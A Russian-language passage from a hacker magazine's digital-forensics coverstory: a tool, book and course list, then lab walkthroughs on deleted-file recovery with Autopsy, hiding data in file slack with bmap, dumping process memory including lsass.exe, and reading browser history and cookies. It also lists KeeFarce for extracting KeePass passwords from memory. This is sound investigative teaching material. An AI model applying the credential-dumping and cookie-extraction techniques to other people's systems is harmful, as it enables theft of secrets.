   дованиям в области сетевого стека — например, дампу и парсингу
   сетевого трафика для выявления таких интересных вещей, как RAT, reverse
    shell, backdoor‐туннели и тому подоб ное.
 • Forensic data analysis посвящена ана лизу файлов, структур данных
   и бинарных последовательностей, оставшихся после атаки или исполь‐
   зовавшихся при вторжении.
 • Mobile device forensics занимается всем, что касается особенностей
   извлечения данных из Android и iOS.
 • Hardware forensic — экспертиза аппаратного обес печения и техничес‐
   ких устройств (примеры тут, тут и еще тут, все ссылки — на PDF). Это нап‐
   равление наименее популярно и наиболее сложно. Сюда входит разбор
   данных на низком уровне (микроконтроллера, про шивки или BIOS), ресерч
   специфических особен ностей работы устройства, к при меру диапазона
   частот работы Wi‐Fi‐передат чика или внут реннего устройства скиммера,
   устанавливаемого на банкоматы.


МЕТОДЫ И ТЕХНИКИ ЭКСПЕРТИЗЫ

Как и в случае с анализом малвари, есть два основных подхода к экспертизе
взломанной машины — статический и динамический анализ. Задачи ста‐
тического анализа — соз дать (скопировать) образ жес ткого дис ка или дампа
оперативной памяти, выявить и вос становить удаленные файлы, остатки ано‐
мальных файлов в %TEMP% и системных директори ях, собрать историю сер‐
финга веб‐браузера, системные логи (события авторизации, аудит доступа
к файлам и директориям и так далее), получить список запущенных в памяти
процессов и открытых коннектов сети.
  Динамический анализ, или live‐ана лиз, использует нарезку из снапшотов
системы, запускаемой в различных условиях для получения полной картины
происходящего. К примеру, малварь склонна удалять свой код и следы инфи‐
цирования после определенных действий. И если снапшот взломанной сис‐
темы был снят до этого момента, есть реальный шанс получить данные о том,
что эта малварь делала на компь ютере жертвы. Соответс твенно, в качестве
подшивки электронных свидетельств здесь могут выступать скриншоты, логи
коннектов в сеть, переда ваемый тра фик, сравнение состояния файловой
системы ОС до и после инцидента.
   Есть неплохая статейка (PDF) на англий ском языке, где вкратце описыва‐
ются и сравниваются эти методы. И еще одна об зорная публикация —
на небезызвестном портале InfoSec Resources.


ОСНОВНЫЕ ИНСТРУМЕНТЫ

Первое, что нужно сделать в начале экспертизы, — это собрать и сохранить
информацию,  чтобы  затем можно  было  вос станавливать  хронологию
и поведенческую картину инцидента.
  Давай  посмотрим,  какие  инс тру менты по  умолчанию  должны  быть
в «походном чемодане» эксперта. Начнем с самого главного — снятия обра‐
за диска для последующего ресерча в лабораторных условиях.


           WARNING

                       Всегда ясно и четко осознавай, какое именно
                      действие и для чего ты совершаешь. Неправиль‐
                      ное использование приведенных в тексте статьи
                       программ может привести к потере информации
                      или искажению получен ных дан ных. Ни автор,
                      ни редакция не несут ответственности за любой
                      ущерб,   причиненный   из‐за   неправильного
                       использования материалов данной статьи.



Соз даем образы диска, раз дела или отдельного сек тора
 • FTK Imager — неплохой инс трумент для кло нирования носителей данных
   в Windows.
 • dc3dd (а также adulau/dcﬂdd) — улучшенные версии стандартной консоль‐
   ной утилиты dd в Linux.
 • Guymager — специализиро ванное при ложение для создания точных копий
   носителей (написано на C++, на базе Qt).
 • Paragon или Acronis — комбайны «все в одном» для просмотра, соз дания,
   изменения, копирования любых данных, раз делов, отдельных секторов.


Об работка сформирован ных образов дисков
 • Imagemounter — утилита на Python, которая работает из командной строки
   и помогает быстро монтировать обра зы дисков.
 • Libewf — тулза и вместе с ней библиотека для обработки форматов EWF
    (Encase Image ﬁle Format).
 • Xmount — крохотная CLI‐утилитка для конверти рования образов дис ков
   в удобный формат с сох ранением всей инфы и метаданных.


Сбор дан ных с хардов
 • DumpIt — утилита для создания дампа оперативной памяти машины.
  Проста и удобна.
 • Encase Forensic Imager — софтинка для соз дания базы доказательных
  файлов.
 • Encrypted Disk Detector — еще одна тулза для криптоаналитиков, помогает
   искать зашифрованные тома TrueCrypt, PGP и Bitlocker.
 • Forensics Acquisition of Websites — специальный браузер, предназначен‐
  ный для захвата веб‐страниц и пос леду ющего рас следования.
 • Live RAM Capturer — годная утилитка для извлечения дампа RAM, в том
   числе приложений, защищенных антиотладоч ной или анти дампинговой
   системой.
 • Magnet RAM Capture — как и прошлая тулза, пред назначена для снятия
  RAM всех версий Windows — от старушки XP до Windows 10 (включая
   и релизы Windows Server).


           WARNING

                      Уделяй пристальное внимание корректному соз‐
                     данию образа системы для дальнейшего изу‐
                         чения. Это позволит быть уверенным в достовер‐
                       ности полученных результатов. Перед любыми
                      действиями,  задевающими  работоспособность
                       системы или сохранность дан ных, обязательно
                      делай снапшоты и резервные копии файлов.



Анализ файлов
 • Crowd Inspect помога ет в получении информации о сетевых процес сах
   и списков двоичных фай лов, связанных с каж дым процес сом. Помимо это‐
   го, линкуется к VirusTotal и другим онлайновым сервисам анализа вре‐
   доносных программ и служ бам репута ции.
 • dCode пре образует раз ные типы данных в значения даты и времени.
 • Bstrings — программа для поиска в двоичных данных, есть поддержка
   регулярных выражений.
 • eCryptfs Parser рекурсивно ана лизирует заголовки каждого файла eCryptfs
   в выбранном катало ге или диске и выводит список шифрованных файлов.
 • Encryption  Analyzer —  утилитка  для  анализа защищенных  паролем
   и зашифрованных дру гими алгоритмами файлов, которая заод но анализи‐
   рует сложность шифрования и предлагает вари анты дешифровки.
 • File Identiﬁer — программа для онлайнового анализа типа файлов по собс‐
   твенной базе сигнатур, которых уже больше двух тысяч.
 • Memoryze — тулза для ана лиза обра зов оперативной памяти, включая
   анализ файлов подкачки и извлечения оттуда данных.
 • ShadowExplorer — утилита для просмотра и дальнейшего извлечения фай‐
   лов из теневых копий в системе Windows.
 • HxD — маленький и быстрый HEX‐редактор.
 • Synalyze It! — HEX‐редактор с поддержкой шаблонов, при этом быстр и в
  нем нет ничего лишнего.
 • wxHex Editor — кросс‐плат форменный HEX‐редактор с возможностью
   сравнивать файлы и кучей других фич.


ИЗВЛЕЧЕНИЕ ДАННЫХ ИЗ ФАЙЛОВ

 • Bulk_extractor — утилитка для вылавливания email, IP‐адресов и телефонов
   из файлов.
 • PhotoRec — утилита для извлечения данных и фай лов изображений.


Об работка дан ных в опе ративной памяти (RAM)
 • Forensics, Memory Integrity & Assurance Tool by invtero — крутой и наворо‐
   ченный фреймворк, который при этом быстро работает.
 •  volatility — опен сорсный набор утилит для раз ностороннего анализа обра‐
   зов физической памяти.
 • Rekall — скрипт для анализа дампов RAM, написанный на Python.
 • KeeFarce — прога для извлечения паролей KeePass из памяти.


АНАЛИЗ СЕТЕВОГО СТЕКА И БРАУЗЕРОВ

 • SiLK — прога для сбо ра, хра нения и анализа данных сетевого потока. Иде‐
   ально подходит для анализа тра фика на магистра ли или границе крупного
   распределенного предприятия или провайдера среднего размера.
 • Wireshark — всемирно извес тный сетевой анализа тор пакетов (сниффер).
  Имеет графический пользовательский интерфейс и широкий набор воз‐
  можностей сор тировки и филь тра ции информации.
 • NetworkMiner — инструмент сетево го анализа для обнаружения ОС, имени
   хоста и открытых портов сетевых узлов с помощью перехвата пакетов
   в формате PCAP.
 • chrome‐url‐dumper — кро шечная прог рамма для извлечения информации
   из браузера Google Chrome.
 • hindsight — еще одна утилитка для ана лиза истории Chrome.


АНАЛИЗ EMAIL-СООБЩЕНИЙ

 • EDB Viewer — мощная утилита для просмотра файлов Outlook (EDB)
   без подключения сервера Exchange.
 • Mail Viewer — утилита для прос мотра файлов Outlook Express, Windows Mail
    / Windows Live Mail, базы данных сооб щений Mozilla Thunderbird и отдель‐
   ных файлов EML.
 • OST Viewer — утилита для просмотра файлов OST Outlook, опять же
   без привязки к серверу Exchange.
 • PST Viewer — вариант предыдущей утилиты, служит для просмотра файлов
  PST Outlook.


ПОИСК АРТЕФАКТОВ НА HDD И ПЕРИФЕРИИ

 • FastIR Collector — мощный функциональ ный сборщик информации о сис‐
   теме Windows (реестр, файловая система, сервисы, процес сы, настройка
   окружения, автозагрузка и так далее).
 • FRED — кросс‐плат форменный быстрый ана лизатор реестра для ОС
   Windows.
 • NTFS USN Journal parser — парсер журналов USN для томов NTFS.
 • RecuperaBit — утилита для вос ста новления данных NTFS.


Спе циализиро ван ные паки и фреймворки
 • Digital Forensics Framework — плат форма с открытым исходным кодом
   для извлечения и исследова ния данных. Есть варианты для CLI и GUI.
 • The Sleuth Kit и Autopsy — еще одна биб лиотека с откры тыми исходни ками
   и коллекция инструментов командной строки для анализа образов дисков.
 • Oxygen Forensic Detective — универсальный криминалистический инстру‐
   мент для иссле дования данных мобильных устройств. Пак входящих в него
   утилит  позволя ет  выполнять  пол ное  извлечение  данных, проводить
   исчерпывающий анализ данных, хра нящихся на телефонах и в облачных
   хранилищах. В наличии есть Forensic Cloud Extractor — встроенная слу жеб‐
   ная программа, собира ющая данные из облачных служб хранения данных;
   средство Forensic Maps — программа, работа ющая с данными геоин‐
  формационных систем (GPS); Forensic Call Data Expert — программа
   для импорта записей данных о вызовах (так называемые CDR‐файлы)
   любого поставщика услуг беспроводной связи и визуального анализа
   соединений або нентов.

Конечно, это далеко не все инстру менты, которые могут пригодиться, а толь‐
ко известные и часто встречающиеся программы. Более полный спи сок тулз
можно посмотреть в Wiki Forensic. На рус ском языке есть очень неплохой
обзор 23 бесплатных инстру ментов на «Хабре», а также на страницах этого
блога и еще вот здесь.


СОБИРАЕМ СВОЮ ЛАБОРАТОРИЮ

Для ресерча и сбо ра артефактов нам будет нуж на специальная лаборатория.
Поскольку мы будем акцентироваться только на софтовой сос тавляющей
экспертизы, то есть без ковыря ния железок, нам в качестве основы впол не
хватит пула из нескольких виртуальных машин и специализированных дистри‐
бутивов с необходимыми тулзами. Гипервизор я тебе пред лагаю выбрать
на свой вкус, это может быть и бесплатный VirtualBox, и VMware.
  Подробнее о том, какие быва ют дистрибутивы, читай в статье «Тулкит
для форензики». Ясное дело, можно соб рать и свой, но зачем, если есть спе‐
циализированные? Лично я предпочитаю DEFT или, как вариант, Remnux,
но CAINE и Parrot OS тоже дос тойны внимания, не говоря уже о платных En‐
case и SMART Linux.





     Демонстрация рабочего стола и меню утилит дистрибути ва DEFT


МАТЕРИАЛЫ ДЛЯ ИЗУЧЕНИЯ

Книги
Так вышло, что русскоязычной литера туры по нашей теме практически нет.
Да оно и неудивитель но, форензика как прикладная деятельность стала
популярна относительно недавно.
 • Н. Н. Федотов. Форензика — компь ютер ная криминалистика, официаль‐
  ный сайт с материалами книги и PDF, дос тупная для загрузки. Это единс‐
   твенный на русском языке и наиболее полный труд, системно рассказыва‐
  ющий о форензике. Из минусов — многие вещи, описанные в книге,
   на сегодня устарели. Одна ко это все‐таки must read как для начинающих,
   так и для тех, кто уже занимается кри мина лис тикой в сфе ре высоких тех‐
   нологий.
 • Network Forensics 1st Edition — этот труд пос вящен особенностям экспер‐
   тизы систем на сетевом уровне. Хорошее пособие, с основ и по шагам
   рассказывающее о сетевом стеке и методах его анализа.
 • File System Forensic Analysis 1st Edition — труд, аналогичный пре дыду щему,
   но посвященный исключительно анализу файлов и файловой системы
   взломанных машин.
 • Practical Mobile Forensics — хороший вариант для новичков, желающих
   заняться мобильной форензикой.
 • The Basics of Digital Forensics:The Primer for Getting Started in Digital Foren‐
   sics — еще одна книга, которую мож но порекомендовать новичкам
   для уверенного старта.
 • Windows Forensic Analysis Toolkit: Advanced Analysis Techniques for Windows
   8 — само название кни ги говорит о продвинутых техниках экспертизы
   и особенностей применения именно в Windows 8.
 • Practical Windows Forensics Paperback — неплохое пособие по форензике
  ОС, файловой системы, реестра, сети и съемных носите лей.
 • Digital Forensics with Kali Linux — можно сказать, это гайд по встроенным
   утилитам из раздела форензики дистрибутива Kali Linux.
 • Windows Registry Forensics: Advanced Digital Forensic Analysis — кни га кон‐
   центрируется на особен ностях парсинга системного реестра Windows,
   извлечении данных и особен ностях, появившихся с Windows 8.
 • Computer Forensics: Investigating File and Operating Systems, Wireless Net‐
   works, and Storage (CHFI) by EC‐Council — официальный мануал по курсу
   обучения CHFI с  уклоном на исследование  артефактов  Wi‐Fi‐сетей
   и носите лей данных.
 • Malware Forensics Field Guide for Windows Systems — хоть эта кни га и не
  имеет прямого отно шения к «классичес кой» форензике, но все же стоит
   ее почитать, особен но если ты рас следуешь инциденты с уклоном в сто‐
   рону малвари.
 • CHFI Computer Hacking Forensic Investigator Certiﬁcation All‐in‐One Exam
   Guide 1st Edition — официальное издание по курсу обучения CHFI. Рас‐
   смотрены все основные темы и вопросы с экзамена.
 • Practical Forensic Imaging: Securing Digital Evidence with Linux Tools — книга,
   целиком посвященная пра вильному подходу к созданию корректного
   образа взломанной системы для ее дальнейшего ресерча в лабораторных
   условиях. Считаю, что это must read для тех, кто начинает заниматься
  ремеслом криминалис тической хай‐тек‐экспертизы.


Материалы и курсы
 • FOR500: Windows Forensic Analysis — курс обучения основам форензики
   от авторитетного института SANS.
 • Free Online Computer Forensics Training Class — CHFI — еще один вариант
   курса по программе CHFI.
 • Android  Forensics &  Security  Testing — материалы  к курсу обучения
   по мобильной форензике.
 • Computer Forensics Fundamentals — базовый курс обучения на площад ке
   Udemy, заяв ленная стоимость — 50 долларов, однако по акции — 14 дол‐
   ларов.
 • Computer Hacking Forensic Investigator (CHFI) — еще один курс на площад‐
   ке Udemy для продвинутых, сто имость 200 долларов, в дни распродаж —
   всего 14.
 • Certiﬁed Cyber Forensics Professional (CCFP) and Certiﬁed Hacking Forensics
   Investigator (CHFI) exams — курс про фессиональной подготовки с даль‐
  нейшей сертификацией по программе CHFI.

Для тех, кто хочет проверить свои зна ния в деле форензики, доступен бес‐
платный онлайновый тест Computer Forensics Fundamentals.


ПОЛЕЗНЫЕ ССЫЛКИ

Мобильная форен зика
 • Криптостойкие андроиды. Как устроено шифрование
 • Извлекаем и анализируем данные из устройств на Android
 • Android — отсле жива ние смартфона без GPS, взлом упаковщика Qihoo
   и модификация приложений в рантайме
 • Изучаем баги LG, Samsung и  Motorola, поз воляющие снять данные
   с зашифрованного смартфо на
 • Яблочный forensic. Извлекаем данные из iOS‐устрой ств при помощи open
   source инструментов
 • Как криминалисты получают ваши данные с гаджетов


Остальные направле ния
 • Отдел расследования инцидентов. Наша подборка программ для про‐
   ведения forensic‐расследова ний
 • Флеш‐память: проб лемы для компьютер ной криминалистики
 • Техническое обеспечение компьютер ной кри мина лис тики — продол жение
 • Сетевая форензика — расследование инци дентов в сети предпри ятия
 • Обзор 20 опенсор сных утилит для форензик‐практики
 • Еще один обзор 22 популярных инстру ментов форензики (2018 год)


Пло щад ки для тре нировки
После изучения матчасти, я уверен, ты готов ринуть ся в бой, чтобы проверить
свои навыки. Но вряд ли у каждого будет возможность сразу попасть
на «живое» расследование. Начинать тренировки лучше, как говорилось
в классическом фильме, «на кошках». В данном случае в роли фарфоровых
кошек из «Операции Ы» выступают заранее подготовленные образы с арте‐
фактами, которые нужно извлечь и про анализировать.
 • Memory samples — набор дампов памяти от Windows до Linux с зашитыми
   в них арте фактами. В качес тве небольшого гайда — статья из наших архи‐
   вов.
 • p0wnlabs Sample Challenges — набор свободно скачиваемых заданий
   на темы web sleuthing и deleted ﬁle recovery.
 • Wireshark Sample Captures — репози торий дампов сетевого трафика.

Краткие руководства и примеры парсинга дампов сетевого трафика можно
найти тут, вот тут и на рус ском вот еще тут.
 • Computer Forensic Reference Data Sets (CFReDS) — репози торий образов
   для трениров ки навыков кримина листической экспертизы.
 • Digital Forensics Tool Testing Images — еще один архив снимков ФС.
 • Digital Corpora — портал организа ции Digital Corpora, соз данный для энту‐
   зиастов кибер форензики, с семплами для тес тирования своих навыков.
 • BlackLight — коммерчес кий набор инстру ментов и демопак для тестирова‐
   ния навыков.


Дру гие полез ные ресурсы
 • Огромный архив ссылок, материалов, описаний по теме форензики
   на GitHub.
 • Cheat Sheets & Posters — чит‐листы и шпаргалки по форензике, созданные
   в институте SANS, и не только!
 • Forensic Computer Analyst Salary — статья о том, сколько зарабатывают
   эксперты по форензике за рубежом. Согласись, недурно!
 • Forensic  Workstations,  Forensic  Hardware,  Forensic  Duplicators_Bridges,
   Forensic Software — железо для аппаратной форензики.


ЗАКЛЮЧЕНИЕ

Вот наш довольно сжатый ликбез по форензике и подошел к финалу. Наде‐
юсь, что тебе было интересно, ты узнал что‐то новое о расследовании инци‐
дентов, заинтересовался этой темой и получил хороший импульс прокачивать
матчасть, свои скиллы и развивать ся дальше!
COVERSTORY

  ИСКУССТВО
 ФОРЕНЗИКИ





                                       Иван Пискунов



     ИСТОЧНИКИ ДАННЫХ, ПОИСК
       И АНАЛИЗ АРТЕФАКТОВ





В предыдущей статье мы познакомили тебя с форензикой —
наукой  о  рас следовании  киберинцидентов. В  этой —
научимся применять конкретные утилиты и техники для обна‐
ружения, сбора и анализа артефактов, оставшихся после
взлома жертвы. Своими руками мы про ведем поиск удален‐
ных файлов и их восста новление, ана лиз нераз меченной
области памяти файла, дамп любых процессов в Windows
для обнаружения малвари или эксплоита, а также анализ
истории URL и извлечение cookie из бра узера.


НАШ ЛАБОРАТОРНЫЙ СТЕНД

Нашим основным форен зик‐дистрибутивом, содержащим пак со всеми необ‐
ходимыми утилитами, будет леген дарный BackTrack. В качестве анализи‐
руемой машины мы используем образ с уста новленной Windows XP. BackTrack
рекомендуется запускать как хостовую ОС, а для XP вполне можно доволь‐
ствоваться бесплатными Oracle VirtualBox или VMware Player.


           WARNING

                       Всегда ясно и четко осознавай, что именно, как и
                      зачем ты делаешь. Звучит банально, но неп‐
                       равильное использование описан ных в  тексте
                         статьи  программ  может  привести  к  потере
                      или искажению получен ных дан ных (криминалис‐
                        тических доказательств). Ни автор, ни редакция
                      не несет ответствен ности за любой ущерб, при‐
                       чиненный  из‐за  неправильного  использования
                      материалов данной статьи.



КЕЙС 1. ПОИСК И ВОССТАНОВЛЕНИЕ УДАЛЕННОГО ФАЙЛА JPEG
С ПОМОЩЬЮ AUTOPSY

Суть данного кейса в том, что бы найти артефакты удаленного файла (JPEG‐
картинка) на жестком диске целевой машины и вос становить его в дру гую
директорию для дальнейшего изу чения.
  Основным инструментом для нас в этой задачке будет Autopsy — это циф‐
ровая платформа для проведения форензик‐про цедур и одновре менно гра‐
фический интерфейс для CLI‐версии известного кита The Sleuth Kit. В час‐
тности, программа позволяет ана лизировать дис ковые устройства, находить
и восстанавливать файлы, извлекать EXIF из картинок, находить и прос матри‐
вать отдельные видеофрагменты. Более подробная информация об инстру‐
менте доступна здесь, а также еще здесь и в одной из наших прошлых статей.
   Итак, начнем.
  Первым делом запускаем BackTrack с GUI‐интерфейсом. Открываем бра‐
узер и по указанной ссылке скачиваем архив JPEG Search Test #1, допол‐
нительную информацию по файлу можно почитать тут. Пос ле жмем Ctrl + T и в
появившемся окне терминала выполняем следующие команды.
  Создаем директории:


# mkdir ‐p /var/forensics/images
# ls ‐ld /var/forensics/images

Распакуем наш архив:


# cd /var/forensics/images
# ls ‐lrta
# unzip 8‐jpeg‐search.zip
# cd 8‐jpeg‐search
# ls ‐lrta





           Распаковка ска чанного архива JPEG Search Test #1

И продолжаем набирать команды в терминале:


 # cd /var/forensics/images/8‐jpeg‐search
 # ls ‐l
 # md5sum 8‐jpeg‐search.dd

Теперь нужно посчитать хеш‐сумму файла в md5sum.





                Хеш‐сумма MD5 распакованного файла

После этого запускаем в GUI‐обо лочке нашу тулзу: Applications → BackTrack
→ Forensics → Forensic Suites → setup Autopsy. Пос ле появления окна на воп‐
рос Have you purchased or downloaded a copy of the NSRL (y/n) жмем n. Затем
переходим в /pentest/forensics/autopsy и запус каем скрипт ./autopsy.
Скрипт стартует локальный web‐сервер с интерфейсом для работы с Autopsy.





               Запуск скрипта ./autopsy из терминала

Как   написано   в   тексте,  мы   открываем   в   браузере   адрес
http://localhost:9999/autopsy. После это го перед нами во всей красе предста‐
ет HTML‐оболочка нашего инс трумента. Все, что нам нужно, — это создать
«новый кейс», ввести имя хоста, наз вание кейса, другую дополнительную
информацию и сохранить получившийся шаб лон.





                   Создаем кейс JPEG‐8‐Inquiry

Переходим в терминал и выполняем команды


# cd /var/forensics/images/8‐jpeg‐search
# ls ‐l
# ls $PWD/8‐jpeg‐search.dd

Копируем строчку


/var/forensics/images/8‐jpeg‐search/8‐jpeg‐search.dd





            Копируем ука занную строчку в окне терминала

Далее возвращаемся в браузер и жмем «Добавить локацию/картинку».





          Скопированную ссылку вставляем в указанную форму

После этого традиционно смело нажимаем кнопку Next и на новой странице
мастера щелкаем вариант Partition.





             В окне мастера выбира ем опцию Partition

На следующем шаге нам нужно сделать три действия, а именно щел кнуть Ig‐
nore the hash value for this image, ука зать в качестве литеры диска С и тип фай‐
ловой системы NTFS.





                Запол няем поля ука занными данными

В конце пошагового мас тера нажимаем единс твенную кнопку Calculate.





                 Закрытие мастера по кнопке Calculate

Наш следующий шаг связан с ана лизом файла, определением его структуры
и содержания. Процесс запускается по кнопке Analysis.





               Запуск ана лиза файла кнопкой Analysis

После нескольких секунд ожидания перед нами появится небольшой отчет
о проанализированном файле — File information и Metadata information.





            Сводка по File information и Metadata information

В качестве результата мы увидим окно со списком удаленных файлов
и кое‐какой допол нительной информа цией.





             Ито говое окно: уда ленные файлы обнаружены

Поздравляю, первый кейс решен!


                                     Продолжение статьи →
COVERSTORY            ← НАЧАЛО СТАТЬИ
 ИСКУССТВО ФОРЕНЗИКИ
             ИСТОЧНИКИ ДАННЫХ, ПОИСК И АНАЛИЗ
                                  АРТЕФАКТОВ





КЕЙС 2. ПОИСК СКРЫТЫХ ДАННЫХ В НЕЗАПОЛНЕННОЙ ОБЛАСТИ
ФАЙЛА С BMAP

Разумеется, все наши читатели слышали о стеганографии — способе скрыть
передачу данных, добавив их в легитим ный файл либо записав эту информа‐
цию в память, занимаемую легитимным файлом (с текстом, музыкой или кар‐
тинкой), без нарушения работоспособности пос леднего.


             INFO

                      Стеганография  —  очень  надежный  способ
                      передачи   сек ретной  информации.  А  если
                      исходную информацию еще и зашифровать, то
                       восстановить ее будет очень зат руднительно.


Для выполнения второго кейса нам понадобится утилита bmap‐tools, здесь
можешь почитать по ней дополнительную информацию. В моем дистрибути ве
предустановленной версии bmap не ока залось, поэтому придется пос тавить
ее ручками. Как и в прошлый раз, первым делом откры ваем терминал в Back‐
Track и пишем следующие команды:


# cd /opt
# mkdir bmap
# cd bmap

После создания директории открываем любой браузер и по при веденной
ссылке скачиваем архив с тулзой.





             Сохраня ем bmap‐1.0.17.tar.gz на свою машину

Снова в терминал, где пишем следующее:


# cd /opt/bmap
# ls ‐l
# gunzip bmap‐1.0.17.tar.gz
# tar ‐xovf bmap‐1.0.17.tar





              Результаты распаковки ска чанного архива

Теперь наша тулза готова скомпилироваться в бинарный файл, для чего
выпол няем команды


# cd /opt/bmap/bmap‐1.0.17
# make

Запуск утилиты:


# ln ‐s /opt/bmap/bmap‐1.0.17/bmap /sbin/bmap
# which bmap
# bmap ‐help





                    Запуск bmap в терминале

Переходим к созданию текстового файла, в который будем прятать наше
«секретное сообщение»:


# cd /var/tmp
# echo "This is a test file" > test.txt
# cat test.txt





                    Создание исходно го test.txt

Создаем «неразмеченную область» внутри нашего исходного файла test.
txt:


# bmap ‐‐mode slack test.txt
# ls ‐l test.txt





           Создаем «неразмеченную область внут ри test.txt

Добавляем наше «секретное сообщение»:


# echo "Top Secret Data Goes Here" | bmap ‐‐mode putslack test.txt
# ls ‐l test
# cat test.txt
# strings test.txt





          Добавляем наше «секретное сообщение» в test.txt

Обрати внимание: изменился только раз мер прос транства, занимаемого
данным файлом на диске, — внутри же самого файла ничего не изменилось.
  Делаем бэк на терминал и про водим эксперимент:


# rm test.txt
# ls ‐l test.txt
# echo "This is a test file" > test.txt
# bmap ‐‐mode slack test.txt
# echo "Your Name"

Что в итоге? Наш файл был уда лен, но секретное сооб щение осталось, пос‐
кольку при стирании были зачищены только сектора дис ка, занимаемые
номинальным файлом. Пос ле того как мы вызвали команду


# bmap ‐‐mode slack test.txt

в терминале появилась строка нашего сообщения, скрытого в неразмечен‐
ной области.





          Сек ретное сооб щение выжило пос ле удаления файла


КЕЙС 3. СОЗДАЕМ ДАМП ПАМЯТИ ВСЕХ ПРОЦЕССОВ WINDOWS,
АНАЛИЗИРУЕМ ВЗАИМОСВЯЗЬ «РОДИТЕЛЬСКИЙ — ДОЧЕРНИЙ»

Для этого небольшого кейса нам понадобится только одна машина с заранее
инсталлированной Windows XP. Скачиваем native‐утилиту от Microsoft под наз‐
ванием Process Explorer. После распаковки архива в любую директорию
запускаем бинарный файл от имени администра тора (для получения пол ного
списка системных и скрытых процес сов) и идем в меню View → Show Process‐
es From All Users.





           Окно Process Explorer после запус ка в Windows XP

Чуть‐чуть о том, что демонстрирует нам прог рамма.
  В колонке Process отоб ража ется дерево активных процессов и их потом‐
ков. Потомок (child) — процесс, созданный другим, родительским (parent)
процессом. Любой процесс может быть и потомком, если он создан в ходе
выпол нения другого про цесса, и родителем, если в ходе его выполнения соз‐
дан другой процесс. Отображение элементов дерева процес сов выполняет‐
ся в соответствии с порядком их запус ка при загрузке операционной системы
и регистрации поль зователя.
  Корень дерева процес сов — уро вень System Idle Process, состояние прос‐
тоя системы. Сле дующим элементом дерева представлен уровень System.
На самом деле System — это не отдельно сущес твующий реальный процесс,
а уровень дерева, предназначенный для отображения активности системы,
связанной с обработкой прерываний, работой системных драйверов, дис‐
петчера сеансов Windows (Session Manager) smss.exe и csrss.exe (Client‐Serv‐
er Runtime).
  Остальная часть дерева отобража ет иерархию реально выполняющихся
в Windows процессов. Так, приложение служб и контроллеров SERVICES.EXE
обеспечивает создание, удаление, запуск и остановку служб (сервисов)
в операционной системе, что и отоб ража ется в списке порождаемых им про‐
цессов.
 • PID — иден тификатор процесса PID — уникальное десятичное чис ло,
   присваиваемое каждому процес су при его создании.
 • CPU — степень использования центрального процессора.
 • Private Bytes — объем оперативной памяти, выделенной данному про‐
   цессу и не разделяемой с дру гими процессами.
 • Working Set — рабочий набор процесса, представляющий собой сум‐
  марный объем всех страниц используемой им памяти в данный момент
   времени. Размер это го набора может изменяться в зависи мости от зап‐
   росов процесса. Боль шая часть процес сов используют раз деляемую
   память (Shared Memory).
 • Description — краткое описание процесса.
 • Company Name — название компании‐разработчика.
 • Path — путь и имя исполняемо го файла.
 • Verified Signer — признак дос товерности цифровой подписи исполня‐
  емого файла. Наличие строки Not veriﬁed говорит о том, что цифровая
   подпись отсутствует или ее не удалось проверить.

Больше подробностей можно узнать из документации.





         Просмотр связки «родительский — дочерний процесс»

Также с помощью Process Explorer можно создать дампы памяти отдельных
процессов или всей системы для дальнейшего изу чения. Эта практика час то
применяется при обнаружении следов инфицирования системы мал варью
или эксплоита. Сделанный дамп можно просмотреть через утилиту Debugging
Tools for Windows.
  В наш сегодняшний материал вопросы детального анализа дампов
не входят, но в качестве неплохого подспорья ты можешь использовать
статьи по WinDbg тут, тут и здесь.





          Создание дампа для сис темно го процесса lsass.exe

Дамп памяти процесса сохраня ет небольшой объем информации о самом
процессе и загруженных компонентах, которые были на момент появления.





      Создание «пол ного» или «усеченного» дампа всех процессов

Полный дамп всех процес сов — это образ, вклю чающий содержимое всей
оперативной памяти компьютера, как пользователь ские, так и системные
процессы. Однако помни: преж де чем дампить, ты дол жен убедиться, что
у тебя хватит места для сохранения на жес тком дис ке. Особенно это касается
серверных редакций ОС.


КЕЙС 4. ВОССТАНАВЛИВАЕМ ИСТОРИЮ ПОСЕЩЕНИЯ URL-
АДРЕСОВ В БРАУЗЕРЕ И ПАРСИМ COOKIE

В заключительном кейсе мы палим, какие URL посещал пользователь
перед тем, как машина дос талась нам в руки для изучения, и пробуем
вытащить дополнительную инфу из сохраненных cookie‐файлов. Рассмат‐
ривать кейс будем на самом банальном примере использования встроенного
браузера Internet Explorer. Для это го нам понадобятся две утилиты: IEHisto‐
ryView — вьювер URL‐истории и IECookiesView — из наз вания понятно, что
просмотрщик cookies.
   Как и в предыдущем кейсе, нам понадобится все та же машина с заранее
инсталлированной Windows XP. Скачиваем на жесткий диск утилиты
IEHistoryView и IECookiesView. Предварительно встро енным в XP IE открываем
несколько сайтов, а после запускаем бинарник.





               Результат работы вьювера IEHistoryView

После запуска тулза автоматичес ки подтягивает всю доступную информацию
о сохраненных в истории URL‐адресах, названии страниц, дате прос мотра,
имени пользовате ля, под которым был произведен сеанс веб‐серфинга.
В итоге можно выстроить связку «что было прос мотрено» — «в какое вре‐
мя» — «каким именно пользователем».
  Далее в глав ном окне программы доступен поиск по ключевому слову.
Введем, например, metasploit.





        Результаты поиска текста metasploit в истории посещения

Самое время приниматься за IECookiesView. Распаковываем пред варительно
скачанный архив в любую директорию и запус каем. После этого ждем нес‐
колько секунд до появления главного окна прог раммы с содержанием сох‐
раненных локально cookie‐файлов.





           Запуск IECookiesView и просмотр cookie‐файлов

Теперь можешь щелкнуть любую строчку из имеющихся cookie, после чего
в нижней панели главного окна станут доступны пункты меню редактирова‐
ния.





        Возможность редактирования выб ранного cookie‐файла





    Редактирование служебной информа ции выб ранного cookie‐файла


ЗАКЛЮЧЕНИЕ

Сегодня мы проделали неплохую исследова тельскую работу: обнаружили
удаленный файл и успешно вос ста новили его, использовали неразмеченные
области секторов диска для сохранения «секретного сообщения», заюзали
утилиты для создания дампов пользовательских про цессов и всей системы,
чтобы искать следы инфицирования мал варью, и рассмотрели при мер вос‐
становления истории веб‐серфинга. Минимум теории и максимум практики
на самых доступных кейсах. Мы и дальше будем придерживаться этого прин‐
ципа, так что в скором времени жди новую порцию кейсов и не туши свет
в своей форензик‐лабора тории! :)
 COVERSTORY





       Андрей Васильков
     редактор, фронемофил, гик,
               к. м. н. и т. п.
        angstroem@hotbox.ru

ТУЛКИТ
ДЛЯ ФОРЕНЗИКИ

 ВЫБИРАЕМ ДИСТРИБУТИВ И НАБОР СОФТА
 ДЛЯ КРИМИНАЛИСТИЧЕСКОГО АНАЛИЗА




 Если твоя задача — найти ули ки на жестком диске, то худ‐
 шее, что ты можешь сделать, — это «натоптать» самос‐
  тоятельно, изменив какие‐то данные и создав новые файлы.
